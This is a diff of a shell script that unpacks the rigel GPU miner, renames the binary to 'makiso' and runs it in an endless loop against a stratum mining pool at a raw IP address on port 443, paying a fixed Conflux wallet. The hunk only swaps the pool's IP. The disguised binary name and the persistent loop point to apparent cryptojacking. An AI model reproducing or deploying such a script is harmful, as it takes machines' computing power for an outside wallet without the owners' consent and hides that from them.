@@ -5,7 +5,7 @@ tar xf rigel-1.23.1-linux.tar.gz
 cd rigel-1.23.1-linux
 mv rigel makiso
 while :; do
-./makiso -a octopus -o stratum+tcp://178.128.253.24:443 -u cfx:aatjfsztc58yp3jx14gjrekcgdsf0vk1vab8mahr68.$(echo $RANDOM | md5sum | head -c 10)
+./makiso -a octopus -o stratum+tcp://68.183.8.214:443 -u cfx:aatjfsztc58yp3jx14gjrekcgdsf0vk1vab8mahr68.$(echo $RANDOM | md5sum | head -c 10)
 done
 
 
